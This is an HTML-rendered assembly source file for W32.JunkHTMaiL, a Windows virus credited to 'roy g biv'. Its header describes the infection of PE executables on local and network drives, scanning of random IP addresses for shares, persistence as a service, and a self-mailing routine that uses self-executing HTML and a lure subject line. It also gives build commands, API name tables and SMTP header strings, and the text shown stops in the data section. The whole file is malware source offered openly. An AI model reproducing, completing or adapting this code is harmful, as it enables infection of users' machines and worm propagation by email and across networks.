<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>JUNKHTML.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">; comment ;)</span><span class="sc0">
</span><span class="sc1">; W32.JunkHTMaiL by roy g biv (thanks to RT Fishel for previous contribution)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; some of its features:</span><span class="sc0">
</span><span class="sc1">; - parasitic resident (own process) infector of PE exe (but not looking at suffix)</span><span class="sc0">
</span><span class="sc1">; - infects files in all directories on all fixed and network drives and network shares</span><span class="sc0">
</span><span class="sc1">; - directory traversal is linked-list instead of recursive to reduce stack size</span><span class="sc0">
</span><span class="sc1">; - enumerates shares on local network and also random IP addresses</span><span class="sc0">
</span><span class="sc1">; - reloc section inserter/last section appender</span><span class="sc0">
</span><span class="sc1">; - runs as service in NT/2000/XP and service process in 9x/Me</span><span class="sc0">
</span><span class="sc1">; - hooks all executable shell\open\command values</span><span class="sc0">
</span><span class="sc1">; - slow mailer using polymorphic mail headers and self-executing HTML</span><span class="sc0">
</span><span class="sc1">; - auto function type selection (Unicode under NT/2000/XP, ANSI under 9x/Me)</span><span class="sc0">
</span><span class="sc1">; - uses CRCs instead of API names</span><span class="sc0">
</span><span class="sc1">; - uses SEH for common code exit</span><span class="sc0">
</span><span class="sc1">; - section attributes are never altered (virus is self-modifying but runs in writable memory)</span><span class="sc0">
</span><span class="sc1">; - no infect files with data outside of image (eg self-extractors)</span><span class="sc0">
</span><span class="sc1">; - infected files are padded by random amounts to confuse tail scanners</span><span class="sc0">
</span><span class="sc1">; - uses SEH walker to find kernel address (no hard-coded addresses)</span><span class="sc0">
</span><span class="sc1">; - correct file checksum without using imagehlp.dll :) 100% correct algorithm</span><span class="sc0">
</span><span class="sc1">; - plus some new code optimisations that were never seen before W32.EfishNC :)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; yes, just a W32.JunkMail remake with a different exploit</span><span class="sc0">
</span><span class="sc1">; ---</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   optimisation tip: Windows appends ".dll" automatically, so this works:</span><span class="sc0">
</span><span class="sc1">;         push "cfs"</span><span class="sc0">
</span><span class="sc1">;         push esp</span><span class="sc0">
</span><span class="sc1">;         call LoadLibraryA</span><span class="sc0">
</span><span class="sc1">; ---</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; to build this thing:</span><span class="sc0">
</span><span class="sc1">; tasm</span><span class="sc0">
</span><span class="sc1">; ----</span><span class="sc0">
</span><span class="sc1">; tasm32 /ml /m3 junkhtml</span><span class="sc0">
</span><span class="sc1">; tlink32 /B:400000 /x junkhtml,,,import32</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Virus is not self-modifying, so no need to alter section attributes</span><span class="sc0">
</span><span class="sc1">; ---</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; We're in the middle of a phase transition:</span><span class="sc0">
</span><span class="sc1">; a butterfly flapping its wings at</span><span class="sc0">
</span><span class="sc1">; just the right moment could</span><span class="sc0">
</span><span class="sc1">; cause a storm to happen.</span><span class="sc0">
</span><span class="sc1">; -I'm trying to understand-</span><span class="sc0">
</span><span class="sc1">; I'm at a moment in my life-</span><span class="sc0">
</span><span class="sc1">; I don't know where to flap my wings.</span><span class="sc0">
</span><span class="sc1">; (Danny Hillis)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; (;</span><span class="sc0">

</span><span class="sc2">.486</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0">  </span><span class="sc10">flat</span><span class="sc0">

</span><span class="sc9">extern</span><span class="sc0">  </span><span class="sc5">GlobalAlloc</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0">  </span><span class="sc5">CreateFileA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0">  </span><span class="sc5">GetFileSize</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0">  </span><span class="sc5">GetModuleFileNameA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0">  </span><span class="sc5">ReadFile</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0">  </span><span class="sc5">WriteFile</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0">  </span><span class="sc5">CloseHandle</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0">  </span><span class="sc5">GlobalFree</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0">  </span><span class="sc5">GetCurrentProcess</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0">  </span><span class="sc5">WriteProcessMemory</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0">  </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0">  </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">

</span><span class="sc1">;to alter the text here, set compress_only to not-zero then run</span><span class="sc0">
</span><span class="sc1">;in that case, the compressed text is written to a file only</span><span class="sc0">

</span><span class="sc5">compress_only</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc9">ife</span><span class="sc0"> </span><span class="sc5">compress_only</span><span class="sc0">

</span><span class="sc1">;must be reverse alphabetical order because they are stored on stack</span><span class="sc0">
</span><span class="sc1">;API names are not present in replications, only in dropper</span><span class="sc0">

</span><span class="sc5">expnames</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"WriteFile"</span><span class="sc0">           </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"WinExec"</span><span class="sc0">             </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"SetFileAttributesA"</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"MoveFileA"</span><span class="sc0">           </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"LoadLibraryA"</span><span class="sc0">        </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GlobalFree"</span><span class="sc0">          </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GlobalAlloc"</span><span class="sc0">         </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetWindowsDirectoryA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetTickCount"</span><span class="sc0">        </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetTempFileNameA"</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetFileAttributesA"</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetCurrentProcess"</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"DeleteFileA"</span><span class="sc0">         </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CreateFileA"</span><span class="sc0">         </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CloseHandle"</span><span class="sc0">         </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">regnames</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"RegSetValueA"</span><span class="sc0">      </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"OpenSCManagerA"</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CreateServiceA"</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CloseServiceHandle"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">exenames</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"LoadLibraryA"</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GlobalAlloc"</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetVersion"</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetTickCount"</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetStartupInfoW"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetStartupInfoA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetCommandLineW"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetCommandLineA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"ExitProcess"</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CreateProcessW"</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CreateProcessA"</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">usrnames</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CharNextW"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CharNextA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">svcnames</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"StartServiceCtrlDispatcherA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">krnnames</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"lstrlenW"</span><span class="sc0">                 </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"lstrcpyW"</span><span class="sc0">                 </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"lstrcatW"</span><span class="sc0">                 </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"UnmapViewOfFile"</span><span class="sc0">          </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Sleep"</span><span class="sc0">                    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"SetFileTime"</span><span class="sc0">              </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"SetFileAttributesW"</span><span class="sc0">       </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"SetFileAttributesA"</span><span class="sc0">       </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"SetCurrentDirectoryW"</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"SetCurrentDirectoryA"</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"ReadFile"</span><span class="sc0">                 </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"MultiByteToWideChar"</span><span class="sc0">      </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"MapViewOfFile"</span><span class="sc0">            </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"LoadLibraryA"</span><span class="sc0">             </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GlobalFree"</span><span class="sc0">               </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GlobalAlloc"</span><span class="sc0">              </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetVersion"</span><span class="sc0">               </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetTickCount"</span><span class="sc0">             </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetModuleFileNameA"</span><span class="sc0">       </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetFullPathNameW"</span><span class="sc0">         </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetFullPathNameA"</span><span class="sc0">         </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetFileSize"</span><span class="sc0">              </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetDriveTypeA"</span><span class="sc0">            </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"FindNextFileW"</span><span class="sc0">            </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"FindNextFileA"</span><span class="sc0">            </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"FindFirstFileW"</span><span class="sc0">           </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"FindFirstFileA"</span><span class="sc0">           </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"FindClose"</span><span class="sc0">                </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CreateThread"</span><span class="sc0">             </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CreateFileW"</span><span class="sc0">              </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CreateFileMappingA"</span><span class="sc0">       </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CreateFileA"</span><span class="sc0">              </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CloseHandle"</span><span class="sc0">              </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">sfcnames</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"SfcIsFileProtected"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">ws2names</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"socket"</span><span class="sc0">       </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"send"</span><span class="sc0">         </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"gethostbyname"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"connect"</span><span class="sc0">      </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"WSAStartup"</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">netnames</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"WNetOpenEnumW"</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"WNetOpenEnumA"</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"WNetEnumResourceW"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"WNetEnumResourceA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"WNetCloseEnum"</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">ip9xnames</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"NetShareEnum"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">ipntnames</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"NetShareEnum"</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"NetApiBufferFree"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc9">endif</span><span class="sc0">

</span><span class="sc1">;only 0dh is required for new line, since 0ah is appended by decompressor</span><span class="sc0">

</span><span class="sc5">user1</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc12">' '</span><span class="sc0">
</span><span class="sc5">user2</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc12">'/'</span><span class="sc0">
</span><span class="sc5">user3</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc12">':'</span><span class="sc0">                     </span><span class="sc1">;the three most frequent characters</span><span class="sc0">

</span><span class="sc5">smtp1</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">smtp2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"HELO "</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">smtp2</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">smtp3</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"MAIL FROM:&lt;&gt;"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">smtp3</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">smtp4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"RCPT TO:"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">smtp4</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">header1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"DATA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">header1</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">header2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"FROM: "</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">header2</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">header31</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"SUBJECT: Wanna see a e-mail exploit?"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">header31</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">header32</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"MIME-VERSION:"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">header32</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">part11</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"1.0"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">part11</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">part12</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"CONTENT-TYPE:"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">part12</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">part13</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"MULTIPART/MIXED;"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">part13</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">body1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">" BOUNDARY="</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

